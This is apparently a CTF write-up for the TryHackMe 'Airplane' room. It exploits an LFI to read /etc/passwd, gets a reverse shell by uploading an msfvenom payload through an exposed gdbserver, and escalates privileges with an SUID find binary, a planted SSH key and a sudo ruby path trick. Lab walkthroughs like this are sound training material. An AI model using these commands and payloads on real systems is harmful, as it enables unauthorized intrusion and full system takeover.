---
title: THM Airplane
author: hanhctf
date: 2024-06-17 12:00:00 +0700
categories: [Write-up, THM]
tags: [LFI]
toc: true
mermaid: true
---

# [**Airplan**](https://tryhackme.com/r/room/airplane)

# Summary

> - LFI in homepage.
> - App is running on port 6048 --> Exploit get revershell.
> - Priv with SUID.

## NMAP

```text
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE=
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8=
|   256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb
6048/tcp open  x11?     syn-ack
8000/tcp open  http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS

```

## Web Enumeration

First of all, add `airplane.thm` to `/etc/hosts`.  
Access home page `http://airplane.thm:8000` will redirected to `http://airplane.thm:8000/?page=index.html`  

![](/commons/THM/Airplane/0_info.png)  

With `Wappalyzer`, we see, app running on Flask web server.  
`/?page=index.html` in URL, first in my mind LFI.  
Check LFI `/etc/passwd` with `Burpsuite`, we can see 2 users `hudson` and `carlos`.  
![](/commons/THM/Airplane/1_LFI.png)  

This is a lab, so try read `id_rsa` or `user.txt` but no luck.  
In fact, in many cases we can use LFI to read id_rsa.  

Check eviroment which app running.  
![](/commons/THM/Airplane/0_1_environ.png)  

Go back to port 6048.  
Check what is running on port 6048.  
I use `Intruder` to check.  
Add request to Intruder.  
![](/commons/THM/Airplane/2_request.png)  

Set payload is number from 1 to 1000 with step 1.  
After run Intruder, filter with `6048`. We found `gdbserver` is running on port 6048.  

![](/commons/THM/Airplane/3_gdbserver.png)  

We found GDBServer Exploition on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver)  

```shell
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.124.72 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.230.30:6048

# Upload elf file
remote put binary.elf /home/hudson/binary.elf

# Set remote executable file
set remote exec-file /home/hudson/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```  

We got revershell.  
![](/commons/THM/Airplane/4_user.png)  

***GOT USER.TXT FLAG***

## Privilege Escalation

Upload `linpeas.sh` (my favorite tool to check priv) to `/tmp`.  

We found SUID with `carlos` user.  
![](/commons/THM/Airplane/5_suid.png)  

We can user [GTFOBIN-find](https://gtfobins.github.io/gtfobins/find/) to get `carlos` shell.  

```shell
$ id
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
$ id
id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
$
```

Upload local id_rsa.pub to `/home/carlos/.ssh/authorized_keys` to ssh as `carlos` to the machine.  

After run `linpeas.sh` as `calos`.  
![](/commons/THM/Airplane/6_root.png)  

```shell
carlos@airplane:/tmp$ pwd
/tmp
carlos@airplane:/tmp$ echo 'system("/bin/bash")' > pwn.rb
carlos@airplane:/tmp$ sudo /usr/bin/ruby /root/../tmp/pwn.rb 
root@airplane:/tmp# 
```  

***GOT ROOT.TXT FLAG***
